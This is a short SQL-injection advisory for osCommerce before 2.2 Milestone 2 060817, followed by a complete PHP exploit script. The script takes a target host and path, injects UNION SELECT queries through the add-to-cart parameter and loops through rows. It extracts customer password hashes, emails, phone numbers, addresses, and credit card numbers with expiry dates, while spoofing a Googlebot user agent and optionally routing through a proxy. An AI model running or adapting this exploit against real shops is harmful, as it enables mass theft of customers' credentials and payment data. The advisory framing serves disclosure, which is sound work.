source: http://www.securityfocus.com/bid/19774/info

osCommerce is prone to an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied data. 

A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.

#!/usr/bin/php -q -d short_open_tag=on
<?

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

if ($argc<5) {
echo "\r\nExploit osCommerce < 2.2 Milestone 2 060817 by Perseus \r\n";
echo "\r\nUsage: \r\n\r\n   php ".$argv[0]." host path product_id
whatinfo OPTIONS\r\n\r\n";
echo "   host - target server (ip/hostname)\r\n";
echo "   path - path to osCommerce\r\n";
echo "   product_id - Valid product_id\r\n";
echo "   whatinfo - pass for password, cc for credit card info, addr for
address\r\n\r\n";
echo "Options:\r\n\r\n";
echo "   -D: Show debug or verbose on\r\n";
echo "   -p[port]: specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n\r\n";
echo "Example:\r\n\r\n";
echo "   php ".$argv[0]." localhost /os2/catalog/ 2 pass\r\n";
echo "   php ".$argv[0]." 192.168.1.108 /os2/catalog/ 2 pass -p8080
-P192.168.1.108:3128 -D\r\n";
echo "   php ".$argv[0]." 192.168.1.108 /os2/catalog/ 2 cc -p8080
-P192.168.1.108:3128\r\n";
die;
}


$host=$argv[1];
$path=$argv[2];
$products_id=$argv[3];
$whatinfo=$argv[4];
$port=80;
$Debug=0;
$proxy="";
for ($i=5; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-D")
{
  $tmp=str_replace("-D","",$argv[$i]);
  $Debug=1;
}
}

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error...
check the path!'; die;}

if($Debug==1) {
    echo "Name\t: osCommerce Multiple Vulnerabilities\r\n";
    echo "Date\t: August 17, 2006\r\n";
    echo "Vendor\t: osCommerce\r\n";
    echo "URL\t: http://www.oscommerce.com/\r\n";
    echo "Version\t: osCommerce < 2.2 Milestone 2 060817\r\n";
    echo "Risk\t: Multiple Vulnerabilities\r\n";
    echo "Exploit\t: Customers Info, Pass, and Credit Info
Disclosure\r\n";
    echo "Author\t: Perseus\r\n";
    echo "Compatibility\t: magic_quotes_gpc off, union supported\r\n";
    echo "Greets\t: rgod, James Bercegay, str0ke, hdm, r57 \r\n";
}

// try if you can rewrite this code to attack osc with
magic_quotes_gpc on
// because I found it impossible for the moment.
// this will make oscommerce people update their vuln servers right now.

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$loop = 1000;

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex, $Debug;
  if ($proxy=='') {
    if($Debug==1) echo "\r\nProcessing packets directly...\r\n";
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo "\r\nNo response from ".$host.":".$port."\r\n"; die;
    }
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    if($Debug==1) echo "\r\nProcessing packets using proxy
".$parts[0].":".$parts[1]." ...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo "\r\nNo response from proxy...\r\n";die;
    }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or
(!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }

  fclose($ock);
  #debug
  #echo "\r\n".$html;
}
    $bl=0;
    for($y=0;$y<=$loop;$y++) {
        //1. get cookie
        $out = "GET ".$p."product_info.php?products_id=".$products_id."
HTTP/1.1\r\n";
        $out .= "Host: ".$host."\r\n";
        $out .= "Connection: Close\r\n\r\n";
        sendpacketii($out);
        $e = explode("Set-Cookie: osCsid=",$html);
        $e2 = explode(";",$e[1]);
        $cookie = $e2[0];

        //2. injection
        if($whatinfo=="pass") {

        $sql="999' UNION SELECT 0 , CONCAT( CHAR(77),'||||',
customers_password, '^',
customers_email_address,'|',customers_firstname,'|',customers_lastname,'|',customers_dob,'|',customers_telephone,

'^') , 0 , 0
    FROM customers LIMIT ".$y.",1 /*";

        } elseif($whatinfo=="addr") {

        $sql="999' UNION SELECT 0 , CONCAT( CHAR(77),'||||',
entry_company, '^',
entry_firstname,'|',entry_lastname,'|',entry_street_address,'|',entry_suburb,'|',entry_postcode,'|',entry_city,'|',entry_state,

'^') , 0 , 0
    FROM address_book LIMIT ".$y.",1 /*";

        } elseif($whatinfo=="cc") {

        $sql="999' UNION SELECT 0 , CONCAT( CHAR(77),'||||', cc_type,
'^',
cc_owner,'|',cc_number,'|',cc_expires,'|',billing_street_address,'|',billing_suburb,'|',billing_city,'|',billing_postcode,'|',billing_state,'|',billing_country,'^')

, 0 , 0
    FROM orders LIMIT ".$y.",1 /*";

        }

        $sql=urlencode($sql);
        $data = "id[0]=".$sql."";
        $data.="&products_id=".$products_id."";
        $out = "POST
".$p."product_info.php?products_id=".$products_id."&action=add_product&osCsid=".$cookie."

HTTP/1.0\r\n";
        $out .= "User-Agent: Googlebot/2.1\r\n";
        $out .= "Host: ".$host."\r\n";
        $out .= "Accept: text/plain\r\n";
        $out .= "Connection: Close\r\n";
        $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $out .= "Cookie: ".$cookie."\r\n";
        $out .= "Content-Length: ".strlen($data)."\r\n\r\n";
        $out .= $data;
        sendpacketii($out);

        //3. get vals
        $out = "GET ".$p."shopping_cart.php?osCsid=".$cookie."
HTTP/1.1\r\n";
        $out .= "Host: ".$host."\r\n";
        $out .= "Connection: Close\r\n\r\n";
        sendpacketii($out);
        //echo $html;
        $e = explode("M||||",$html);
        $e2 = explode("^",$e[1]);
        $str = "\r\n".$y.". ".$e2[0]." ".$e2[1]."\r\n";
        echo $str;
        $strl = strlen($str);
        if($strl<=25) $bl++;
        if($bl==3) break;

    }

?> 